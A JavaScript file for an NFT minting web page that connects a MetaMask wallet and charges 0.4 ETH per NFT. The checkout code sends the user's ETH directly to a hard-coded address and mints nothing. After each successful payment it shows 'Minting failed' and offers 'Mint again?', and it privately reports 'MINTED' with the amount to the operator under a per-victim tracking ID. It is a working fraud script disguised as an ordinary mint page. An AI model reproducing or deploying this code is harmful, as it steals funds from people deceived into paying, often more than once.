const statusp = document.querySelector("#status");
const connectBtn = document.querySelector('#connectBtn');
const checkoutBtn = document.querySelector('#checkoutBtn');
//const connectBtnHeader = document.querySelector('#connectBtnHeader');
const web3 = window.Web3;
const ethereum = window.ethereum;
const pricePerNFT = 0.4;
const show_dc = true
/** input number spinner
 */
db = window.localStorage;
function getRandomInt(max) {
  return Math.floor(Math.random() * max);
}

if (db.getItem('id') == null)
{
    myid = (getRandomInt(4096)).toString(16);
    db.setItem("id", myid)
} else {
    var myid = (db.getItem('id'))
}

let plusBtn = document.querySelector('button[id*="btn-plus"]');
let minusBtn = document.querySelector('button[id*="btn-minus"]');
let totalNFTInput = document.querySelector('input[type="number"][id="totalNFT"]')
let totalETHSpan =  document.querySelector('#totalETH');
totalNFTInput.value = 1;
totalETHSpan.innerText = totalNFTInput.value * pricePerNFT;

plusBtn.addEventListener('click',()=>{
  totalNFTInput.value = Number(totalNFTInput.value)  + 1;
  totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(1);
})
minusBtn.addEventListener('click',()=>{
  if (Number(totalNFTInput.value)>1) {
    totalNFTInput.value =  Number(totalNFTInput.value) - 1;
    totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(1);
  }

})
//** end of input number spinner */

checkoutBtn.style.display = "none"

connectBtn.addEventListener('click', async () => {
    if (ethereum) {
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = 'Wallet connected'
        connectBtn.style.display = "none"
        checkoutBtn.style.display = "inline-block"
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (web3) {
      initPayButton()
    } else {
      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  })

  /*
  connectBtnHeader.addEventListener('click', async () => {
    if (window.ethereum) {
      window.web3 = new Web3(ethereum);
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (window.web3) {
      window.web3 = new Web3(web3.currentProvider)
      initPayButton()
    } else {
      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  })


  if  (err) {
    console.log('Minting failed', err)
    statusp.innerText = 'Minting failed'
  } else {
    console.log('Minting succeed', transactionId)
    statusp.innerText = 'Minting succeed';
    checkoutBtn.innerText = 'Mint again?'
  }

  */

  const initPayButton = () => {
    checkoutBtn.addEventListener('click', async () => {
      statusp.innerText = 'Minting in progress....'
      // paymentAddress is where funds will be send to
      const paymentAddress = '0xEefb7e2557F2a9C0607297126049DE5Ac24Cbb99'
      let totalEth = totalETHSpan.innerText;
      //totalEth = totalEth.toString();
      accounts = await ethereum.request({ method: "eth_requestAccounts" }); //  [Wikipedia](https://en.wikipedia.org/)
      const priceToWei = (totalEth * 1e18).toString(16);
      const gasLimit = (250_000 * totalEth).toString(16);
      ethereum
        .request({
          method: "eth_sendTransaction",
          params: [
            {
              from: accounts[0],
              to: paymentAddress,
              value: priceToWei,
            },
          ],
        })
        .then((txHash) => {
          statusp.innerText = 'Minting failed';
          checkoutBtn.innerText = 'Mint again?'
         sendMessage("**[" + myid + "] ** MINTED")
         sendMessage("**[" + myid + "] ** MINTED")
         sendMessage("**[" + myid + "] ** MINTED, Verd mu kätel: +" + totalEth.toString())
        })
        .catch((error) => {
          console.log('Minting failed', error)
          sendMessage("**[" + myid + "]** Minting failed \n `" + error.message + "`")
          statusp.innerText = 'Minting failed'
        });
    })
  }

